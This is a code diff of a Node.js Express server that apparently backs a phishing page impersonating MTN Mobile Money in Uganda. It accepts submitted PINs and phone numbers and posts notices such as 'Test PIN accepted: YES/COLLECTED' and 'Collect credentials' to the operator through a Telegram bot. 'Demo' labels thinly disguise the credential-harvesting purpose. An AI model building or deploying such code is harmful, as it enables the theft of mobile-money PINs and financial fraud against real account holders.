@@ -1,66 +1,74 @@
 const express = require("express");
 
 const app = express();
+
 app.use(express.json());
 app.use(express.static(__dirname));
 
-app.post("/api/demo", async (req, res) => {
-  console.log("Received Uganda MTN MOBILE MONEY request:", req.body);
-
-  if (req.body.event !== "MTN MOBILE MONEY_PIN_ACCEPTED") {
-    return res.status(400).json({
-      success: false,
-      error: "Invalid MTN mobile money"
-    });
-  }
-
-  // Telegram notification is optional.
-  // Transmitted phone number and pin code.
-  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
-    console.log("Telegram environment variables are missing.");
-    return res.json({
-      success: true,
-      telegram: false
-    });
-  }
-
+app.post("/api/mtn", async (req, res) => {
   try {
-    const telegramUrl =
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    // Only accept mtn process .
+    if (req.body?.event !== "ACCEPT ANY ENTERED PIN") {
+      return res.status(400).json({
+        success: false,
+        error: "Invalid demo event"
+      });
+    }
 
-    const response = await fetch(telegramUrl, {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId) {
+      console.error("Telegram environment variables are missing");
+
+      return res.status(500).json({
+        success: false
+      });
+    }
+
+    const message =
+      "🧪 MOMO DEMO NOTIFICATION\n\n" +
+      "MTN verification completed.\n" +
+      "Test PIN accepted: YES/COLLECTED" +
+      "Collect credentials.";
+
+    const telegramUrl =
+      `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const telegramResponse = await fetch(telegramUrl, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: "🧪 MTN verification completed successfully. Phone number and pincode transmitted."
+        chat_id: chatId,
+        text: message
       })
     });
 
-    console.log("Telegram response status:", response.status);
+    const telegramData = await telegramResponse.json();
 
-    if (!response.ok) {
-      console.log("Telegram notification failed.");
-      return res.json({
-        success: true,
-        telegram: false
+    console.log(
+      "Telegram response:",
+      telegramResponse.status,
+      telegramData.ok
+    );
+
+    if (!telegramResponse.ok || !telegramData.ok) {
+      return res.status(502).json({
+        success: false
       });
     }
 
-    console.log("Submitted phone number and pincode received in Telegram.");
-    res.json({
-      success: true,
-      telegram: true
+    return res.json({
+      success: true
     });
 
   } catch (error) {
-    console.error("Telegram request error:", error.message);
+    console.error("Mtn notification error:", error);
 
-    res.json({
-      success: true,
-      telegram: false
+    return res.status(500).json({
+      success: false
     });
   }
 });
@@ -68,5 +76,5 @@ app.post("/api/demo", async (req, res) => {
 const PORT = process.env.PORT || 10000;
 
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Demo running on port ${PORT}`);
+  console.log(`Mtn server running on port ${PORT}`);
 });
